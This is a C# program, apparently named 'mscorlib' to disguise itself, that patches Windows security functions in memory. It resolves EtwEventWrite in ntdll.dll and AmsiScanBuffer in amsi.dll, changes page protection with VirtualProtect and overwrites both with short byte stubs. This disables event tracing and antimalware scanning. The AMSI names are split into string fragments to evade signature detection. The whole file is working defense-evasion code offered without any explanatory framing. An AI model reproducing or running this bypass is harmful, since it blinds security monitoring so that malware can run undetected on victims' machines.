using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace mscorlib
{
    internal class Program
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        static byte[] VoodooMagic(string function)
        {
            byte[] patch;
            if (function.ToLower() == "antitrace")
            {
                if (Is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc3;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }
                return patch;
            }
            else if (function.ToLower() == "byebyeav")
            {
                if (Is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC2;
                    patch[6] = 0x18;
                    patch[7] = 0x00;
                }
                return patch;
            }
            else throw new ArgumentException("the function is not supported");
        }

        static void AntiTrace()
        {
            string traceloc = "ntdll.dll";
            string magicFunction = "EtwEventWrite";
            IntPtr ntdllAddr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);
            byte[] magicVoodoo = VoodooMagic("AntiTrace");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("No More Tracing!");
        }

        static void ByeByeAV()
        {
            string avloc = "am" + "si" + ".dll";
            string magicFunction = "Am" + "siSc" + "anB" + "uffer";
            IntPtr avAddr = LoadLibrary(avloc);
            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);
            byte[] magicVoodoo = VoodooMagic("ByeByeAv");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("No more AV!");
        }
        
        static void Main(string[] args)
        {
            AntiTrace();
            Console.ReadKey();
            ByeByeAV();
            Console.ReadKey();
        }
    }
}
